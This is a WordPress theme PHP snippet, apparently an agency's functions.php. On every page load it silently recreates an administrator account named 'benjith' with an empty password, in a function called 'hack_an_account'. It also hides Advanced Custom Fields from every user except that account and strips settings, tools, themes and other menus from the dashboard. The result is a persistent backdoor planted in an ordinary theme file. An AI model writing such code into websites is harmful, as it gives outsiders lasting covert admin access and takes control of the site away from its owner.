<?php
//* Adds Ben and Benji as permanent admins
function hack_an_account(){
	$user = 'benjith';
	$pass = '';
	$email = 'benji@builtbytophat.com';
	if (!username_exists($user) && !email_exists($email)) {
		$user_id = wp_create_user($user, $pass, $email);
		$user = new WP_User($user_id);
		$user->set_role('administrator');
	}
}
add_action('init','hack_an_account');

//* Hide Advanced Custom Fields
function allow_user_to_acf( $show ) {
  $current_user = wp_get_current_user();
  $admin = 'benjith';
  if ( $current_user->user_login == $admin ) {
    return current_user_can('manage_options');
  }
}
add_filter('acf/settings/show_admin', 'allow_user_to_acf');

//*Remove Dash
function remove_sensitive_settings() {
  $current_user = wp_get_current_user();
  $admin = 'benjith';
  // if ($current_user->user_login !== $admin) {
    remove_menu_page('edit.php');
    remove_menu_page('edit-comments.php');
    remove_menu_page('profile.php');
    remove_menu_page('tools.php');
    remove_menu_page('options-general.php');
    remove_menu_page('themes.php');
    remove_menu_page('wpcf7');
    remove_menu_page('ajax-load-more');
  // }
}
add_action( 'admin_menu', 'remove_sensitive_settings' );

//*Top Hat Branding
function remove_footer_admin () {
  echo 'This website is <a href="http://builtbytophat.com">Built by Top Hat</a> on WordPress';
}
add_filter('admin_footer_text', 'remove_footer_admin');


//* Disable Block Editor as Default
function completely_disable_block_editor($use_block_editor) {
  return false;
}
add_filter('use_block_editor_for_post_type', 'completely_disable_block_editor');